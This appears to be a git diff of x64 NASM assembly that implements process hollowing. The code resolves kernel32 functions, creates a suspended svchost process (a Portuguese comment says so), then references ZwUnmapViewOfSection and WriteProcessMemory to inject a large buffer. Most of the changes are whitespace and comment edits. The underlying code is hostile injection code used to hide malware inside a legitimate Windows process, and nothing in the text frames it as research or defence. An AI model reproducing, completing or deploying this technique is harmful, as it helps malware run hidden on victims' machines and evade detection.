@@ -6,7 +6,7 @@ section .BSS
 	
 section .data	
 	
-struc CONTEXT
+    struc CONTEXT
        .P1Home:                                      resq 1
        .P2Home:                                      resq 1
        .P3Home:                                      resq 1
@@ -45,9 +45,9 @@ struc CONTEXT
        .R14:                                         resq 1
        .R15:                                         resq 1
        .Rip:                                         resq 1
-endstruc
+    endstruc
 	
-ctx istruc CONTEXT 
+    ctx istruc CONTEXT 
        at CONTEXT.P1Home,                            dq 0
        at CONTEXT.P2Home,                            dq 0
        at CONTEXT.P3Home,                            dq 0
@@ -86,9 +86,10 @@ ctx istruc CONTEXT
        at CONTEXT.R14,                               dq 0
        at CONTEXT.R15,                               dq 0
        at CONTEXT.Rip,                               dq 0
-iend
+    iend
 	
-    struc PROCESSINFO
+    
+	struc PROCESSINFO
         .hProcess                                    resd 2
         .hThread                                     resd 2
         .dwProcessId                                 resd 1
@@ -104,7 +105,7 @@ iend
     iend
 	
 	
-   struc STARTUPINFOA 
+    struc STARTUPINFOA 
         .cb                                          resd 1
         .lpReserved                                  resb 8
         .lpDesktop                                   resb 8
@@ -164,7 +165,7 @@ iend
 	
 section .codered
 	CodeRed:
-	Buffer2 times 800000                         db 0
+	Buffer2 times 800000                          db 0
 	
 section .deccode
 	decCode:
@@ -173,8 +174,6 @@ section .deccode
 	;GetProcddress no registrador R14
 	call Locate_kernel32
 	
-	
-	;CRIA PROCESSO PARA OUTRO programa suspenso
 	
 	;Lookup CreateProcessA
 	mov rax, 0x41737365636f
@@ -189,7 +188,7 @@ section .deccode
 	add rsp, 0x10
 	mov r12, rax
 	
-	;Call CreateProcessA
+	;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
 	lea rdx,[ProcInfo+PROCESSINFO.hProcess]
 	mov [rsp+0x48], rdx
 	xor rdx,rdx
@@ -291,10 +290,6 @@ section .deccode
 	
 	
 	
-	
-	
-	
-	
 	call Locate_kernel32
 	call LoadLibrary
 	mov rbx,rcx
@@ -362,8 +357,11 @@ section .deccode
 	mov r15,rax
 	add rsp, 0x30
 	add rsp, 0x10
-
+	
+	
 	;delta
+
+	;ZwUnmapViewOfSection
 
 	WriteProcess:
 		;Lookup WriteProcessMemory
